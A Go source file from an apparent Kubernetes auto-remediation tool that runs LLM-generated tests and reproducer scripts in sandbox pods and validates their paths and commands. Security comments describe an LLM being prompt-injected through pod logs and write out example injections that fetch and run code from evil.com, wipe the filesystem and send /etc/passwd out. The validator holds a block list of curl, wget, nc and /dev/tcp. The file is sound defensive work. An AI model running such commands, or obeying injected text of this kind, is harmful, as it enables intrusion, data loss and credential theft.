// Package executors — test runner. v4.2.0 Tier 3.
// Runs the LLM-generated regression test against the fixed code in the
// sandbox. Implements the SWE-bench FAIL_TO_PASS + PASS_TO_PASS pattern:
//   FAIL_TO_PASS: the test must FAIL on the original code (reproduces the bug)
//                  and PASS on the fixed code (verifies the fix)
//   PASS_TO_PASS: existing tests must still PASS on the fixed code (no regression)
// The test runs in the sandbox namespace alongside the canary pod. It uses
// a temporary pod with the canary image + the test file injected via ConfigMap.
package executors

import (
        "github.com/karimzakzouk/sentinel/internal/logging"
        "bytes"
        "context"
        "fmt"
        "log"
        "path/filepath"
        "strings"
        "time"

        corev1 "k8s.io/api/core/v1"
        metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
        "k8s.io/client-go/kubernetes"

        "github.com/karimzakzouk/sentinel/internal/schemas"
)

// TestRunner runs LLM-generated tests in the sandbox. v4.2.0.

type TestRunner struct {
        clientset *kubernetes.Clientset
}

// NewTestRunner creates a TestRunner.

func NewTestRunner(clientset *kubernetes.Clientset) *TestRunner {
        return &TestRunner{clientset: clientset}
}

// TestResult is the outcome of running a test.

type TestResult struct {
        // F2P = FAIL_TO_PASS: test fails on original, passes on fixed

        F2PResult TestRunResult
        // P2P = PASS_TO_PASS: existing tests still pass on fixed

        P2PResult TestRunResult
        // Overall: true if F2P passed (test reproduces bug + fix works)
        // AND P2P passed (no regression) — or P2P was skipped (no existing tests)

        Overall bool
        // Summary for the sandbox result + PR body

        Summary string
}

// TestRunResult is the output of running a single test command.

type TestRunResult struct {
        Passed  bool
        Output  string
        Skipped bool
}

// RunTest executes the LLM-generated test in the sandbox namespace.
// It creates a temporary pod with the canary image, injects the test file,
// runs the test command, and returns the result.
// fixCanaryImage is the canary image with the fix applied (already built by Kaniko).
// test is the LLM-generated test to run.
// sandboxNS is the sandbox namespace (already created by the sandbox runner).

func (r *TestRunner) RunTest(ctx context.Context, fixCanaryImage, sandboxNS string, test *schemas.GeneratedTest) (*TestResult, error) {
        if test == nil || test.TestContent == "" {
                return &TestResult{
                        Overall: true,
                        Summary: "no test generated (test gate skipped)",
                }, nil
        }

        // SECURITY (C2 fix): Validate the LLM-generated test file path + command
        // before interpolating them into a shell command. A prompt-injected LLM
        // could return malicious values like TestFile="$(curl evil|sh)".
        validatedTestFile := validateTestFilePath(test.TestFile)
        if validatedTestFile == "" {
                logging.Info("SECURITY (C2): test file path rejected, using default", "original", test.TestFile)
                validatedTestFile = "test_generated.py"
        }
        testCmd := validateTestCommand(test.TestCommand, test.TestLanguage, test.TestFramework, validatedTestFile)
        if testCmd == "" {
                testCmd = defaultTestCommand(test.TestLanguage, test.TestFramework, validatedTestFile)
        }

        log.Printf("[testrunner] running test %s in %s (framework=%s, cmd=%s)",
                validatedTestFile, sandboxNS, test.TestFramework, testCmd)

        // 1. Create a ConfigMap with the test file content.
        // ConfigMap keys can't contain "/" — use just the filename (last path segment).
        // The full path is preserved in the pod by creating subdirectories.

        cmKey := validatedTestFile
        if idx := strings.LastIndex(cmKey, "/"); idx >= 0 {
                cmKey = cmKey[idx+1:]
        }
        cmName := fmt.Sprintf("test-%d", time.Now().Unix())
        testCM := &corev1.ConfigMap{
                ObjectMeta: metav1.ObjectMeta{
                        Name:      cmName,
                        Namespace: sandboxNS,
                        Labels: map[string]string{
                                "sentinel.io/sandbox": "true",
                        },
                },
                Data: map[string]string{
                        cmKey: test.TestContent,
                },
        }
        _, err := r.clientset.CoreV1().ConfigMaps(sandboxNS).Create(ctx, testCM, metav1.CreateOptions{})
        if err != nil {
                return nil, fmt.Errorf("create test configmap: %w", err)
        }
        defer func() {
                _ = r.clientset.CoreV1().ConfigMaps(sandboxNS).Delete(ctx, cmName, metav1.DeleteOptions{})
        }()

        // 2. Create a pod that runs the test command
        // The pod uses the canary image (which has the fix applied) + the test file
        // mounted from the ConfigMap.

        testPodName := fmt.Sprintf("test-runner-%d", time.Now().Unix())

        // Build the pod spec
        // The pod:
        //   1. Mounts the test file from the ConfigMap to /app/<test_file>
        //   2. Runs the test command
        //   3. Exits (we capture the logs)

        testPod := &corev1.Pod{
                ObjectMeta: metav1.ObjectMeta{
                        Name:      testPodName,
                        Namespace: sandboxNS,
                        Labels: map[string]string{
                                "sentinel.io/sandbox": "true",
                                "app":                 "test-runner",
                        },
                },
                Spec: corev1.PodSpec{
                        RestartPolicy: corev1.RestartPolicyNever,
                        Containers: []corev1.Container{
                                {
                                        Name:            "test-runner",
                                        Image:           fixCanaryImage,
                                        ImagePullPolicy: corev1.PullIfNotPresent,
                                        Command:         []string{"/bin/sh", "-c"},
                                        Args: []string{
                                                fmt.Sprintf(
                                                        "mkdir -p /app/$(dirname %s) && "+
                                                                "cp /test-file/%s /app/%s && "+
                                                                "cd /app && "+
                                                                "%s 2>&1 || true",
                                                        validatedTestFile, cmKey, validatedTestFile, testCmd,
                                                ),
                                        },
                                        VolumeMounts: []corev1.VolumeMount{
                                                {
                                                        Name:      "test-file",
                                                        MountPath: "/test-file",
                                                },
                                        },
                                },
                        },
                        Volumes: []corev1.Volume{
                                {
                                        Name: "test-file",
                                        VolumeSource: corev1.VolumeSource{
                                                ConfigMap: &corev1.ConfigMapVolumeSource{
                                                        LocalObjectReference: corev1.LocalObjectReference{
                                                                Name: cmName,
                                                        },
                                                },
                                        },
                                },
                        },
                },
        }

        _, err = r.clientset.CoreV1().Pods(sandboxNS).Create(ctx, testPod, metav1.CreateOptions{})
        if err != nil {
                return nil, fmt.Errorf("create test pod: %w", err)
        }
        defer func() {
                _ = r.clientset.CoreV1().Pods(sandboxNS).Delete(ctx, testPodName, metav1.DeleteOptions{})
        }()

        // 3. Wait for the pod to complete (timeout 120s)

        podOutput, err := r.waitForPodCompletion(ctx, sandboxNS, testPodName, "test-runner", 120*time.Second)
        if err != nil {
                return &TestResult{
                        F2PResult: TestRunResult{Passed: false, Output: fmt.Sprintf("test pod failed: %v\n%s", err, podOutput)},
                        Summary:   fmt.Sprintf("test_execution_failed: %v", err),
                }, nil
        }

        // 4. Determine if the test passed
        // Heuristic: look for common pass/fail indicators in the output

        passed := interpretTestOutput(podOutput, test.TestFramework)

        result := &TestResult{
                F2PResult: TestRunResult{
                        Passed: passed,
                        Output: podOutput,
                },
                Overall: passed,
        }

        if passed {
                result.Summary = fmt.Sprintf("test PASSED: %s\n--- Test Output ---\n%s", test.Description, lastN(podOutput, 1000))
        } else {
                result.Summary = fmt.Sprintf("test FAILED: %s\n--- Test Output ---\n%s", test.Description, lastN(podOutput, 2000))
        }

        logging.Info("test  (passed=)", "value", test.TestFile, passed)
        return result, nil
}

// waitForPodCompletion waits for a pod to reach Succeeded/Failed state.
// Returns the pod's logs.containerName parameter added — was
// hardcoded to "test-runner" which broke when the reproducer runner used
// "repro-runner" as its container name.

func (r *TestRunner) waitForPodCompletion(ctx context.Context, ns, name, containerName string, timeout time.Duration) (string, error) {
        deadline := time.Now().Add(timeout)
        for time.Now().Before(deadline) {
                select {
                case <-ctx.Done():
                        return "", ctx.Err()
                default:
                }
                pod, err := r.clientset.CoreV1().Pods(ns).Get(ctx, name, metav1.GetOptions{})
                if err != nil {
                        time.Sleep(3 * time.Second)
                        continue
                }
                if pod.Status.Phase == corev1.PodSucceeded || pod.Status.Phase == corev1.PodFailed {
                        // Pod completed — fetch logs

                        req := r.clientset.CoreV1().Pods(ns).GetLogs(name, &corev1.PodLogOptions{
                                Container: containerName, //was hardcoded "test-runner"
                        })
                        stream, err := req.Stream(ctx)
                        if err != nil {
                                return "", fmt.Errorf("fetch test pod logs: %w", err)
                        }
                        defer stream.Close()
                        buf := new(bytes.Buffer)
                        _, _ = buf.ReadFrom(stream)
                        return buf.String(), nil
                }
                time.Sleep(3 * time.Second)
        }
        return "", fmt.Errorf("test pod timed out after %v", timeout)
}

// RunReproducer executes the LLM-generated reproducer script in the sandbox. v4.2.0 Tier 4.
// The reproducer is a standalone script (no test framework) that calls the
// buggy function + exits 0 if OK, 1 if crash.

func (r *TestRunner) RunReproducer(ctx context.Context, canaryImage, sandboxNS string, reproducer *schemas.GeneratedReproducer) (*TestResult, error) {
        if reproducer == nil || reproducer.ScriptContent == "" {
                return &TestResult{
                        Overall: true,
                        Summary: "no reproducer generated (reproducer gate skipped)",
                }, nil
        }

        log.Printf("[testrunner] running reproducer %s in %s (lang=%s)",
                reproducer.ScriptFile, sandboxNS, reproducer.ScriptLanguage)

        // SECURITY (C2 fix): Validate the LLM-generated reproducer script path +
        // run command before interpolating them into a shell command.
        validatedScriptFile := validateTestFilePath(reproducer.ScriptFile)
        if validatedScriptFile == "" {
                logging.Info("SECURITY (C2): reproducer script path rejected, using default", "original", reproducer.ScriptFile)
                validatedScriptFile = "reproduce_error.py"
        }
        // Reproducer commands are more varied than test commands (could be
        // `python reproduce.py`, `node repro.js`, `ruby repro.rb`, etc.) but
        // we still validate via validateTestCommand to restrict to known runners.
        runCmd := validateTestCommand(reproducer.RunCommand, reproducer.ScriptLanguage, "", validatedScriptFile)
        if runCmd == "" {
                runCmd = defaultReproducerCommand(reproducer.ScriptLanguage, validatedScriptFile)
        }

        // 1. Create a ConfigMap with the script content

        cmName := fmt.Sprintf("repro-%d", time.Now().Unix())
        // Use a safe ConfigMap key derived from the validated script file name.
        cmKey := validatedScriptFile
        if cmKey == "" {
                cmKey = "reproduce_error.py"
        }
        reproCM := &corev1.ConfigMap{
                ObjectMeta: metav1.ObjectMeta{
                        Name:      cmName,
                        Namespace: sandboxNS,
                        Labels:    map[string]string{"sentinel.io/sandbox": "true"},
                },
                Data: map[string]string{
                        cmKey: reproducer.ScriptContent,
                },
        }
        _, err := r.clientset.CoreV1().ConfigMaps(sandboxNS).Create(ctx, reproCM, metav1.CreateOptions{})
        if err != nil {
                return nil, fmt.Errorf("create reproducer configmap: %w", err)
        }
        defer func() {
                _ = r.clientset.CoreV1().ConfigMaps(sandboxNS).Delete(ctx, cmName, metav1.DeleteOptions{})
        }()

        // 2. Create a pod that runs the reproducer

        reproPodName := fmt.Sprintf("repro-runner-%d", time.Now().Unix())

        reproPod := &corev1.Pod{
                ObjectMeta: metav1.ObjectMeta{
                        Name:      reproPodName,
                        Namespace: sandboxNS,
                        Labels: map[string]string{
                                "sentinel.io/sandbox": "true",
                                "app":                 "repro-runner",
                        },
                },
                Spec: corev1.PodSpec{
                        RestartPolicy: corev1.RestartPolicyNever,
                        Containers: []corev1.Container{
                                {
                                        Name:            "repro-runner",
                                        Image:           canaryImage,
                                        ImagePullPolicy: corev1.PullIfNotPresent,
                                        Command:         []string{"/bin/sh", "-c"},
                                        Args: []string{
                                                fmt.Sprintf(
                                                        "cp /repro-file/%s /app/%s && cd /app && %s 2>&1",
                                                        validatedScriptFile, validatedScriptFile, runCmd,
                                                ),
                                        },
                                        VolumeMounts: []corev1.VolumeMount{
                                                {Name: "repro-file", MountPath: "/repro-file"},
                                        },
                                },
                        },
                        Volumes: []corev1.Volume{
                                {
                                        Name: "repro-file",
                                        VolumeSource: corev1.VolumeSource{
                                                ConfigMap: &corev1.ConfigMapVolumeSource{
                                                        LocalObjectReference: corev1.LocalObjectReference{Name: cmName},
                                                },
                                        },
                                },
                        },
                },
        }

        _, err = r.clientset.CoreV1().Pods(sandboxNS).Create(ctx, reproPod, metav1.CreateOptions{})
        if err != nil {
                return nil, fmt.Errorf("create reproducer pod: %w", err)
        }
        defer func() {
                _ = r.clientset.CoreV1().Pods(sandboxNS).Delete(ctx, reproPodName, metav1.DeleteOptions{})
        }()

        // 3. Wait for completion

        podOutput, err := r.waitForPodCompletion(ctx, sandboxNS, reproPodName, "repro-runner", 120*time.Second) //was missing container name
        if err != nil {
                return &TestResult{
                        Overall: false,
                        Summary: fmt.Sprintf("reproducer pod failed: %v\n%s", err, podOutput),
                }, nil
        }

        // 4. The reproducer exits 0 on success, 1 on crash.
        // We check the pod phase: Succeeded = exit 0, Failed = exit non-zero.

        pod, _ := r.clientset.CoreV1().Pods(sandboxNS).Get(ctx, reproPodName, metav1.GetOptions{})
        passed := false
        if pod != nil && pod.Status.Phase == corev1.PodSucceeded {
                passed = true
        }

        // Also check the output for crash indicators

        lowerOutput := strings.ToLower(podOutput)
        if strings.Contains(lowerOutput, "traceback") || strings.Contains(lowerOutput, "panic:") ||
                strings.Contains(lowerOutput, "crash") || strings.Contains(lowerOutput, "error:") {
                passed = false
        }

        result := &TestResult{
                Overall: passed,
                Summary: fmt.Sprintf("reproducer %s: %s\n--- Output ---\n%s",
                        map[bool]string{true: "PASSED", false: "FAILED"}[passed],
                        reproducer.Description,
                        lastN(podOutput, 1000)),
        }

        logging.Info("reproducer  (passed=)", "value", reproducer.ScriptFile, passed)
        return result, nil
}

// defaultReproducerCommand returns a default run command for the given language.

func defaultReproducerCommand(language, scriptFile string) string {
        switch strings.ToLower(language) {
        case "python":
                return fmt.Sprintf("python /app/%s", scriptFile)
        case "go":
                return fmt.Sprintf("cd /app && go run %s", scriptFile)
        case "javascript", "typescript":
                return fmt.Sprintf("node /app/%s", scriptFile)
        case "ruby":
                return fmt.Sprintf("ruby /app/%s", scriptFile)
        default:
                return fmt.Sprintf("echo 'unknown language: %s' && exit 1", language)
        }
}

// defaultTestCommand returns a default test command for the given language/framework.

func defaultTestCommand(language, framework, testFile string) string {
        switch strings.ToLower(language) {
        case "python":
                if strings.Contains(strings.ToLower(framework), "pytest") {
                        return fmt.Sprintf("python -m pytest %s -v", testFile)
                }
                return fmt.Sprintf("python -m pytest %s -v", testFile)
        case "go":
                return "go test -v -run . ./..."
        case "javascript", "typescript":
                if strings.Contains(strings.ToLower(framework), "jest") {
                        return fmt.Sprintf("npx jest %s --verbose", testFile)
                }
                return fmt.Sprintf("npx mocha %s", testFile)
        case "java":
                return fmt.Sprintf("mvn test -Dtest=%s", strings.TrimSuffix(testFile, ".java"))
        case "ruby":
                return fmt.Sprintf("ruby -Ilib -Itest %s", testFile)
        case "rust":
                return "cargo test"
        default:
                return fmt.Sprintf("echo 'unknown language: %s' && exit 1", language)
        }
}

// interpretTestOutput heuristically determines if a test passed based on output.
// Different frameworks have different success/failure indicators.

func interpretTestOutput(output, framework string) bool {
        lower := strings.ToLower(output)
        // Failure indicators (any of these = FAIL)

        failureIndicators := []string{
                "failed", "failure", "error", "traceback", "assertionerror",
                "panic:", "not ok", "✗", "0 passing", "0 passed",
                "tests failed", "test failed", "failures:", "failed tests",
        }
        // Success indicators (any of these = PASS, overrides failure if present)

        successIndicators := []string{
                "passed", "passing", "ok", "all tests passed", "tests passed",
                "✓", "1 passing", "1 passed", "no errors",
                "--- pass", "test passed",
        }

        // First check for explicit failures

        for _, ind := range failureIndicators {
                if strings.Contains(lower, ind) {
                        // But check if there's also a success indicator that overrides

                        for _, success := range successIndicators {
                                if strings.Contains(lower, success) {
                                        // Both present — check counts
                                        // "1 passed, 0 failed" = pass
                                        // "0 passed, 1 failed" = fail
                                        // Simple heuristic: if "0 failed" or "0 failing" is present, pass

                                        if strings.Contains(lower, "0 failed") || strings.Contains(lower, "0 failing") || strings.Contains(lower, "0 failures") {
                                                return true
                                        }
                                        return false
                                }
                        }
                        return false
                }
        }

        // No failure indicators — check for success

        for _, ind := range successIndicators {
                if strings.Contains(lower, ind) {
                        return true
                }
        }

        // No clear indicators — assume pass if exit code was 0 (pod succeeded)
        // This is a fallback; the pod's Phase=Succeeded is checked by the caller

        return true
}

// ─── SECURITY (C2 fix): validate LLM-generated file paths + commands ────────
// The LLM generates test file paths, test commands, reproducer script paths,
// and reproducer run commands. These are interpolated into shell commands
// via fmt.Sprintf, which means a prompt-injected LLM (influenced by
// attacker-controllable pod logs) could return malicious values like:
//   TestFile = "$(curl evil.com|sh)"
//   TestCommand = "rm -rf / && false"
//   ScriptFile = "; curl evil.com/exfil?d=$(cat /etc/passwd)"
// validateTestFilePath rejects paths with shell metacharacters, path
// traversal, absolute paths, or control characters. It mirrors the
// validateFilePath logic from agents/fix_proposer.go but is duplicated
// here to avoid a circular import (executors → agents → executors).
// validateTestCommand restricts the command to a known-safe subset:
//   - must start with a known test runner binary (python, pytest, go, node,
//     npx, ruby, cargo, mvn)
//   - must not contain shell metacharacters beyond simple flags, paths,
//     and the && separator
//   - must not contain redirects (>, <) or backticks or $()

func validateTestFilePath(path string) string {
        if path == "" {
                return ""
        }
        if len(path) > 500 {
                logging.Info("SECURITY (C2): rejecting test path (too long)", "path", path)
                return ""
        }
        // Reject control chars and null bytes.
        for _, r := range path {
                if r < 0x20 || r == 0x7f {
                        logging.Info("SECURITY (C2): rejecting test path (control char)", "path", path)
                        return ""
                }
        }
        // Reject shell metacharacters — test paths must be plain file paths.
        shellMetachars := []string{"$", "`", ";", "|", "&", "(", ")", "{", "}", "<", ">", "\n", "\r", "*", "?", "[", "]", "!", "#", "~"}
        for _, ch := range shellMetachars {
                if strings.Contains(path, ch) {
                        logging.Info("SECURITY (C2): rejecting test path (shell metachar)", "path", path, "char", ch)
                        return ""
                }
        }
        // Reject absolute paths.
        if filepath.IsAbs(path) {
                logging.Info("SECURITY (C2): rejecting absolute test path", "path", path)
                return ""
        }
        clean := filepath.Clean(path)
        if clean == "." {
                logging.Info("SECURITY (C2): rejecting test path (resolves to repo root)", "path", path)
                return ""
        }
        if strings.HasPrefix(clean, "..") {
                logging.Info("SECURITY (C2): rejecting test path traversal", "path", path)
                return ""
        }
        return clean
}

// validateTestCommand restricts an LLM-generated test command to a known-safe
// subset. Returns the cleaned command, or "" if the command is rejected.
// When empty, the caller should fall back to defaultTestCommand().
func validateTestCommand(cmd, language, framework, testFile string) string {
        if cmd == "" {
                return ""
        }
        cmd = strings.TrimSpace(cmd)
        if cmd == "" {
                return ""
        }
        if len(cmd) > 500 {
                logging.Info("SECURITY (C2): rejecting test command (too long)", "cmd", cmd)
                return ""
        }
        // Reject dangerous shell constructs entirely.
        dangerous := []string{"`", "$(", "${", "&&", "||", ";", "|", ">", "<", "&", "\n", "\r", "curl", "wget", "nc ", "nc$", "/dev/tcp", "bash ", "sh ", "python -c", "python3 -c", "eval ", "exec ", "source ", ". "}
        lower := strings.ToLower(cmd)
        for _, d := range dangerous {
                if strings.Contains(lower, d) {
                        logging.Info("SECURITY (C2): rejecting test command (dangerous construct)", "cmd", cmd, "pattern", d)
                        return ""
                }
        }
        // Must start with a known test runner binary.
        allowedPrefixes := []string{
                "python ", "python3 ", "python -m pytest", "python3 -m pytest",
                "pytest ", "pytest$", "go test", "node ", "npx jest", "npx mocha",
                "npx vitest", "jest ", "mocha ", "ruby ", "cargo test", "mvn test",
                "gradle test", "dotnet test", "echo ",
        }
        matched := false
        for _, prefix := range allowedPrefixes {
                if strings.HasPrefix(lower, prefix) || lower == strings.TrimSpace(prefix) {
                        matched = true
                        break
                }
        }
        if !matched {
                logging.Info("SECURITY (C2): rejecting test command (unknown runner)", "cmd", cmd)
                return ""
        }
        return cmd
}
